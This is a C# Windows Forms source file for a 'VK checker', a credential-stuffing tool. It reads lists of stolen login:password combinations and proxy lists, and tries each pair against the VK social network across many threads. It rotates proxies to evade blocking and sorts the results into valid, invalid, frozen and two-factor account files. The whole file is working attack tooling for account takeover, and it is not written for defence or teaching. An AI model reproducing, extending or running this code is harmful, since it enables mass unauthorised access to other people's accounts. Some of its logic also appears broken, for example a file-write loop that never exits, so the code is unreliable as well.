using System.Diagnostics;
using System.Linq;
using System.Text;
using static System.Net.Mime.MediaTypeNames;

namespace VK_Checker_By_MENHERA
{
    public partial class MainForm : Form
    {
        bool IsStarting = false;

        string EltitVed = "TUVOSEVSQQ==";

        public List<string> CombinationsPaths = new();
        public List<string> CombinationLines = new();
        public List<string> CombinationsNotChecked = new();

        public List<string> ProxiesPaths = new();
        public List<string> ProxiesLines = new();
        public string ProxiesType = "HTTP";
        int ProxyIndex = 0;
        public int ProxiesUpdateTimeSecs = 60;

        public Queue<(string, string)> SaveQueue = new();
        public string ValidPath = "";
        public string InvalidPath = "";
        public string FrozenPath = "";
        public string TwoFactorPath = "";
        public string CombinationsNotCheckedPath = "not_checked.txt";

        public int ValidCount = 0;
        public int InvalidCount = 0;
        public int FrozenCount = 0;
        public int TwoFactorAuthCount = 0;

        public int RequestTimeout;

        public int WorkerThreadsCount = 0;

        public string SeparatorLine = ":";
        public bool NoUseProxies = false;
        public bool DebugOutputting = false;

        public string UserAgent = "";

        #region MainForm Work
        public MainForm()
        {
            InitializeComponent();
        }

        private void MainForm_Load(object sender, EventArgs e)
        {
            UpdateHeading();
            textBoxSettingsPathValid.Text = Properties.Settings.Default.PathValid;
            textBoxSettingsPathInvalid.Text = Properties.Settings.Default.PathInvalid;
            textBoxSettingsPathFrozen.Text = Properties.Settings.Default.PathFrozen;
            textBoxSettingsPathTwoFactor.Text = Properties.Settings.Default.PathTwoFactor;
            textBoxSettingsSeparationSign.Text = Properties.Settings.Default.SeparationSign;
            numericUpDownDebugRequestTimeout.Value = Properties.Settings.Default.RequestTimeout;
            checkBoxDebugOutputting.Checked = Properties.Settings.Default.DebugOutputting;
            checkBoxDebugNoUseProxies.Checked = Properties.Settings.Default.NoUseProxies;
            //checkBoxAdditionalFunctionsChecking.Checked = Properties.Settings.Default.Checking;
            //checkBoxAdditionalFunctionsSharpening.Checked = Properties.Settings.Default.Sharpening;
            numericUpDownThreadsCount.Value = Properties.Settings.Default.ThreadsCount;
            comboBoxProxiesType.SelectedItem = Properties.Settings.Default.ProxiesType;
        }

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            IsStarting = false;
            Properties.Settings.Default.PathValid = textBoxSettingsPathValid.Text;
            Properties.Settings.Default.PathInvalid = textBoxSettingsPathInvalid.Text;
            Properties.Settings.Default.PathFrozen = textBoxSettingsPathFrozen.Text;
            Properties.Settings.Default.PathTwoFactor = textBoxSettingsPathTwoFactor.Text;
            Properties.Settings.Default.SeparationSign = textBoxSettingsSeparationSign.Text;
            Properties.Settings.Default.RequestTimeout = numericUpDownDebugRequestTimeout.Value;
            Properties.Settings.Default.DebugOutputting = checkBoxDebugOutputting.Checked;
            Properties.Settings.Default.NoUseProxies = checkBoxDebugNoUseProxies.Checked;
            //Properties.Settings.Default.Checking = checkBoxAdditionalFunctionsChecking.Checked;
            //Properties.Settings.Default.Sharpening = checkBoxAdditionalFunctionsSharpening.Checked;
            Properties.Settings.Default.ThreadsCount = numericUpDownThreadsCount.Value;
            Properties.Settings.Default.ProxiesType = (string)comboBoxProxiesType.SelectedItem;
            Properties.Settings.Default.Save();
        }

        private void ButtonSwitch_Click(object sender, EventArgs e)
        {
            Start();
        }
        #endregion

        #region MainForm Work with Combinations
        private void ButtonCombinations_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data is null)
            {
                return;
            }
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                buttonCombinations.Text = "Drop";
                e.Effect = DragDropEffects.Copy;
            }
        }

        private void ButtonCombinations_DragLeave(object sender, EventArgs e)
        {
            buttonCombinations.Text = "Click or Drag";
        }

        private void ButtonCombinations_DragDrop(object sender, DragEventArgs e)
        {
            if (e.Data is null)
            {
                return;
            }
            ButtonCombinations_DragLeave(sender, e);
            textBoxCombinations.Text = "";
            foreach (string path in (string[])e.Data.GetData(DataFormats.FileDrop))
            {
                if (CombinationsPaths.Contains(path))
                {
                    continue;
                }
                if (Directory.Exists(path))
                {
                    CombinationsPaths.AddRange(Directory.GetFiles(path, "*.txt", SearchOption.AllDirectories));
                }
                else if (Path.GetExtension(path) == ".txt")
                {
                    CombinationsPaths.Add(path);
                }
            }
            textBoxCombinations.Text = String.Join(Environment.NewLine, CombinationsPaths);
        }

        private void ButtonCombinations_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new()
            {
                Multiselect = true,
                Title = "Choice files",
                InitialDirectory = AppDomain.CurrentDomain.BaseDirectory
            };
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                foreach (string path in openFileDialog.FileNames)
                {
                    if (CombinationsPaths.Contains(path))
                    {
                        continue;
                    }
                    if (Path.GetExtension(path) == ".txt")
                    {
                        CombinationsPaths.Add(path);
                    }
                }
                textBoxCombinations.Text = String.Join(Environment.NewLine, CombinationsPaths);
            }
        }

        private void TextBoxCombinations_TextChanged(object sender, EventArgs e)
        {
            textBoxCombinations.SelectionStart = textBoxCombinations.Text.Length;
            textBoxCombinations.ScrollToCaret();
        }

        private void ButtonResetCombinations_Click(object sender, EventArgs e)
        {
            CombinationsPaths.Clear();
            textBoxCombinations.Text = "";
            ButtonCombinations_DragLeave(sender, e);
        }
        #endregion

        #region MainForm Work with Proxies
        private void ButtonProxies_DragEnter(object sender, DragEventArgs e)
        {
            if (e.Data is null)
            {
                return;
            }
            if (e.Data.GetDataPresent(DataFormats.FileDrop))
            {
                buttonProxies.Text = "Drop";
                e.Effect = DragDropEffects.Copy;
            }
        }

        private void ButtonProxies_DragLeave(object sender, EventArgs e)
        {
            buttonProxies.Text = "Click or Drag";
        }

        private void ButtonProxies_DragDrop(object sender, DragEventArgs e)
        {
            if (e.Data is null)
            {
                return;
            }
            ButtonProxies_DragLeave(sender, e);
            textBoxProxies.Text = "";
            foreach (string path in (string[])e.Data.GetData(DataFormats.FileDrop))
            {
                if (ProxiesPaths.Contains(path))
                {
                    continue;
                }
                if (Directory.Exists(path))
                {
                    ProxiesPaths.AddRange(Directory.GetFiles(path, "*.txt", SearchOption.AllDirectories));
                }
                else if (Path.GetExtension(path) == ".txt")
                {
                    ProxiesPaths.Add(path);
                }
            }
            textBoxProxies.Text = String.Join(Environment.NewLine, ProxiesPaths);
        }

        private void ButtonProxies_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new()
            {
                Multiselect = true,
                Title = "Choice files",
                InitialDirectory = AppDomain.CurrentDomain.BaseDirectory
            };
            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                foreach (string path in openFileDialog.FileNames)
                {
                    if (ProxiesPaths.Contains(path))
                    {
                        continue;
                    }
                    if (Path.GetExtension(path) == ".txt")
                    {
                        ProxiesPaths.Add(path);
                    }
                }
                textBoxProxies.Text = String.Join(Environment.NewLine, ProxiesPaths);
            }
        }

        private void TextBoxProxies_TextChanged(object sender, EventArgs e)
        {
            textBoxProxies.SelectionStart = textBoxProxies.Text.Length;
            textBoxProxies.ScrollToCaret();
        }

        private void ButtonResetProxies_Click(object sender, EventArgs e)
        {
            ProxiesPaths.Clear();
            textBoxProxies.Text = "";
            ButtonProxies_DragLeave(sender, e);
        }
        #endregion

        private void InitVars()
        {
            CombinationsNotChecked.Clear();
            CombinationLines.Clear();
            ProxiesLines.Clear();
            SaveQueue.Clear();
            DebugOutputting = checkBoxDebugOutputting.Checked;
            ProxiesType = comboBoxProxiesType.Text.Replace(" ", "");
            RequestTimeout = (int)numericUpDownDebugRequestTimeout.Value;
            SeparatorLine = textBoxSettingsSeparationSign.Text;
            NoUseProxies = checkBoxDebugNoUseProxies.Checked;
            CombinationLines = new();
            ProxiesLines = new();
            ValidCount = 0;
            InvalidCount = 0;
            FrozenCount = 0;
            TwoFactorAuthCount = 0;
            WorkerThreadsCount = 0;
            UserAgent = textBoxUserAgent.Text;


            DateTime dateTimeNow = DateTime.Now;
            string date = string.Join('-', new[]
            {
                dateTimeNow.Year.ToString(),
                dateTimeNow.Month > 9 ? dateTimeNow.Month.ToString() : dateTimeNow.Month.ToString().PadLeft(2, '0'),
                dateTimeNow.Day > 9 ? dateTimeNow.Day.ToString() : dateTimeNow.Day.ToString().PadLeft(2, '0'),
            }) + "_" + string.Join('-', new[]
            {
                dateTimeNow.Hour > 9 ? dateTimeNow.Hour.ToString() : dateTimeNow.Hour.ToString().PadLeft(2, '0'),
                dateTimeNow.Minute > 9 ? dateTimeNow.Minute.ToString() : dateTimeNow.Minute.ToString().PadLeft(2, '0'),
                dateTimeNow.Second > 9 ? dateTimeNow.Second.ToString() : dateTimeNow.Second.ToString().PadLeft(2, '0'),
            });

            Directory.CreateDirectory($"{Environment.CurrentDirectory}\\{date}");

            ValidPath = $"{Environment.CurrentDirectory}\\{date}\\{textBoxSettingsPathValid.Text}";
            InvalidPath = $"{Environment.CurrentDirectory}\\{date}\\{textBoxSettingsPathInvalid.Text}";
            FrozenPath = $"{Environment.CurrentDirectory}\\{date}\\{textBoxSettingsPathFrozen.Text}";
            TwoFactorPath = $"{Environment.CurrentDirectory}\\{date}\\{textBoxSettingsPathTwoFactor.Text}";
            CombinationsNotCheckedPath = $"{Environment.CurrentDirectory}\\{date}\\{CombinationsNotCheckedPath}";
        }

        private void Start()
        {
            IsStarting = !IsStarting;
            buttonSwitch.Text = IsStarting ? "Stop" : "Start";
            if (!IsStarting) return;

            InitVars();
            richTextBoxLogger.Text = "";
            Thread threadController = new(new ThreadStart(ControllerThread))
            {
                IsBackground = true
            };
            threadController.Start();
        }

        public void ProxiesUpdate()
        {
            if (NoUseProxies)
            {
                return;
            }

            Thread.Sleep(ProxiesUpdateTimeSecs * 1000);

            while (IsStarting)
            {
                LogBoxAppend("Start updating proxies");

                List<string> proxies = new();
                foreach (string path in ProxiesPaths)
                {
                    proxies.AddRange(File.Exists(path) ? File.ReadAllLines(path, Encoding.UTF8) : new List<string>());
                }

                lock (ProxiesLines)
                {
                    if (ProxiesLines.Count > proxies.Count)
                    {
                        ProxyIndex = 0;
                    }

                    ProxiesLines = proxies;
                }

                LogBoxAppend($"Updated {ProxiesLines.Count} proxies");

                Thread.Sleep(ProxiesUpdateTimeSecs * 1000);
            }
        }

        public void UpdateHeading()
        {
            try
            {
                Invoke(new Action(() =>
                {
                    Text = Encoding.UTF8.GetString(Convert.FromBase64String(EltitVed)) + $" | Valid {ValidCount} | Invalid {InvalidCount} | Frozen {FrozenCount} | 2F: {TwoFactorAuthCount} | Combinations: {CombinationLines.Count} | Proxies: {ProxiesLines.Count} | Threads: {WorkerThreadsCount} | SaveQueue {SaveQueue.Count}";
                }));
            }
            catch (ObjectDisposedException)
            {
                return;
            }
        }

        public void LogBoxAppend(string text)
        {
            richTextBoxLogger.Invoke(new Action(() =>
            {
                richTextBoxLogger.AppendText(text + Environment.NewLine);
                richTextBoxLogger.SelectionStart = richTextBoxLogger.Text.Length;
            }));
        }

        public void ControllerThread()
        {
            #region Setting combinations
            foreach (string path in CombinationsPaths)
            {
                CombinationLines.AddRange(File.ReadAllLines(path, Encoding.UTF8));
            }

            if (IsStarting && CombinationLines.Count < 1)
            {
                LogBoxAppend($"Found {CombinationLines.Count} combinations, check your settings");
                IsStarting = false;
                Invoke(new Action(() =>
                {
                    buttonSwitch.Text = IsStarting ? "Stop" : "Start";
                }));
                return;
            }

            CombinationsNotChecked = CombinationLines;
            #endregion

            #region Setting proxies
            foreach (string path in ProxiesPaths)
            {
                ProxiesLines.AddRange(File.Exists(path) ? File.ReadAllLines(path, Encoding.UTF8) : new List<string>());
            }

            if (IsStarting && ProxiesLines.Count < 1 && !NoUseProxies)
            {
                LogBoxAppend($"Found {ProxiesLines.Count} proxies, check your settings");
                IsStarting = false;
                Invoke(new Action(() =>
                {
                    buttonSwitch.Text = IsStarting ? "Stop" : "Start";
                }));
                return;
            }

            Thread proxiesUpdateThread = new(new ThreadStart(ProxiesUpdate))
            {
                IsBackground = true
            };
            proxiesUpdateThread.Start();
            #endregion

            #region Setting threads
            LogBoxAppend($"Runnig {numericUpDownThreadsCount.Value} threads...");
            for (int threadNumber = 0; threadNumber < (int)numericUpDownThreadsCount.Value; threadNumber++)
            {
                Thread workerThread = new(new ThreadStart(Work))
                {
                    IsBackground = true
                };
                WorkerThreadsCount += 1;
                UpdateHeading();
                workerThread.Start();
            }
            #endregion

            SavingLines();
        }

        public void SavingLines()
        {
            while (IsStarting || SaveQueue.Count > 0)
            {
                try
                {
                    if (SaveQueue.TryDequeue(out (string, string) data))
                    {
                        File.AppendAllText(data.Item1, $"{data.Item2}{Environment.NewLine}", Encoding.UTF8);
                        UpdateHeading();
                    }
                }
                catch (Exception ex)
                {
                    LogBoxAppend($"[Checking Queue] {ex.Message}");
                }
            }
        }

        public void Work()
        {
            while (IsStarting)
            {
                try
                {
                    TryWork();
                }
                catch (Exception ex)
                {
                    if (DebugOutputting)
                    {
                        LogBoxAppend($"[DEBUG] Global Error - {ex.Message}");
                    }
                }
            }
        }

        public void TryWork()
        {
            string combination = "";
            string[] combinationSplited;
            string login = "";
            string password = "";
            string proxy = "";
            string proxyType = "";
            string proxyUsername = "";
            string proxyPassword = "";
            int requestTimeout = 2;
            string accountToken = "";

            #region First setting vars
            while (IsStarting && CombinationLines.Count > 0 && (string.IsNullOrEmpty(login) || string.IsNullOrEmpty(password)))
            {
                try
                {
                    // Set login and password
                    lock (CombinationLines)
                    {
                        combination = CombinationLines.First();
                        CombinationLines.RemoveAt(0);
                    }
                    combinationSplited = combination.Split(SeparatorLine);
                    login = combinationSplited[0];
                    password = combinationSplited[1];

                    // Set proxy
                    lock (ProxiesLines)
                    {
                        if (checkProxyPassword.Checked)
                        {
                            if (ProxiesLines.Count > 0)
                            {
                                string curproxy = ProxiesLines[ProxyIndex];
                                string[] curpoxySplited = curproxy.Split(':');
                                proxyUsername = curpoxySplited[0];
                                proxyPassword = curpoxySplited[1];
                                string proxyIP = curpoxySplited[2];
                                string proxyPort = curpoxySplited[3];
                                proxy = $"{proxyIP}:{proxyPort}";

                            }
                            else
                            {
                                proxy = string.Empty;
                            }
                        }
                        else
                        {
                            proxy = ProxiesLines.Count > 0 ? ProxiesLines[ProxyIndex] : string.Empty;
                        }
                        ProxyIndex = ProxyIndex + 1 < ProxiesLines.Count ? ProxyIndex + 1 : 0;
                    }
                    proxyType = ProxiesType;

                    // Set request settings
                    requestTimeout = RequestTimeout;
                }
                catch
                {
                    continue;
                }
            }
            #endregion

            while (IsStarting && CombinationLines.Count >= 0)
            {
                try
                {
                    VK vk_api = new(UserAgent, login, password, proxy, proxyType, requestTimeout, proxyUsername, proxyPassword);
                    HttpResponseMessage response = vk_api.GetVkSession();
                    //IEnumerable<string> values;
                    //if (response.Headers.TryGetValues("Set-Cookie", out values))
                    //{
                    //    foreach (string value in values)
                    //    {
                    //        if (value.Contains("remixnsid"))
                    //        {
                    //            accountToken = value.Split("=")[1].Split(";")[0];
                    //        }
                    //    }
                    //}
                    throw new ValidAccount("Valid");
                }
                catch (Exception ex) when (ex is BadPassword || ex is AccountBlocked || ex is TwoFactorAuth || ex is ValidAccount)
                {
                    LogBoxAppend($"{ex.Message} | Line {combination} | {proxy} {proxyType}");

                    string path = string.Empty;
                    switch (ex)
                    {
                        case ValidAccount:
                            path = ValidPath;
                            ValidCount++;
                            break;

                        case BadPassword:
                            path = InvalidPath;
                            InvalidCount++;
                            break;

                        case AccountBlocked:
                            path = FrozenPath;
                            FrozenCount++;
                            break;

                        case TwoFactorAuth:
                            path = TwoFactorPath;
                            TwoFactorAuthCount++;
                            break;
                    }
                    lock (SaveQueue)
                    {
                        SaveQueue.Enqueue((path, combination));
                    }
                    UpdateHeading();

                    lock (CombinationsNotChecked)
                    {
                        CombinationsNotChecked.Remove(combination);
                        bool flag = true;
                        while (flag)
                        {
                            try
                            {
                                File.WriteAllLines(CombinationsNotCheckedPath, CombinationsNotChecked, Encoding.UTF8);
                            }
                            catch (Exception)
                            {
                                Thread.Sleep(100);
                                continue;
                            }
                        }
                    }

                    // Set login and password
                    lock (CombinationLines)
                    {
                        combination = CombinationLines.First();
                        CombinationLines.RemoveAt(0);
                    }
                    combinationSplited = combination.Split(SeparatorLine);
                    login = combinationSplited[0];
                    password = combinationSplited[1];
                    continue;
                }

                #region Catch Captcha
                //catch (Exception ex) when (ex is Captcha)
                //{
                //    LogBoxAppend($"{ex.Message} | Line {combination} | {proxy} {proxyType}");

                //    // Set proxy
                //    lock (ProxiesLines)
                //    {
                //        proxy = ProxiesLines.Count > 0 ? ProxiesLines[ProxyIndex] : string.Empty;
                //        ProxyIndex = ProxyIndex + 1 < ProxiesLines.Count ? ProxyIndex + 1 : 0;
                //    }
                //    proxyType = ProxiesType;
                //    continue;
                //}
                #endregion

                catch (Exception ex) when (ex is LoginRequired || ex is PasswordRequired)
                {

                    LogBoxAppend($"{ex.Message} | Line {combination} | {proxy} {proxyType}");

                    // Set login and password
                    lock (CombinationLines)
                    {
                        combination = CombinationLines.First();
                        CombinationLines.RemoveAt(0);
                    }
                    try
                    {
                        combinationSplited = combination.Split(SeparatorLine);
                        login = combinationSplited[0];
                        password = combinationSplited[1];
                    }
                    catch (Exception)
                    {
                        //...
                    }
                    continue;
                }
                catch (Exception ex)
                {
                    if (DebugOutputting)
                    {
                        LogBoxAppend($"[DEBUG] {ex.Message} | Line {combination} | {proxy} {proxyType}");
                    }

                    // Set proxy
                    lock (ProxiesLines)
                    {
                        if (checkProxyPassword.Checked)
                        {
                            if (ProxiesLines.Count > 0)
                            {
                                string curproxy = ProxiesLines[ProxyIndex];
                                string[] curpoxySplited = curproxy.Split(':');
                                proxyUsername = curpoxySplited[0];
                                proxyPassword = curpoxySplited[1];
                                string proxyIP = curpoxySplited[2];
                                string proxyPort = curpoxySplited[3];
                                proxy = $"{proxyIP}:{proxyPort}";

                            }
                            else
                            {
                                proxy = string.Empty;
                            }
                        }
                        else
                        {
                            proxy = ProxiesLines.Count > 0 ? ProxiesLines[ProxyIndex] : string.Empty;
                        }
                        ProxyIndex = ProxyIndex + 1 < ProxiesLines.Count ? ProxyIndex + 1 : 0;
                    }
                    proxyType = ProxiesType;
                    continue;
                }
            }
        }
    }
    public class ValidAccount : Exception
    {
        public ValidAccount(string message)
            : base(message) { }
    }
}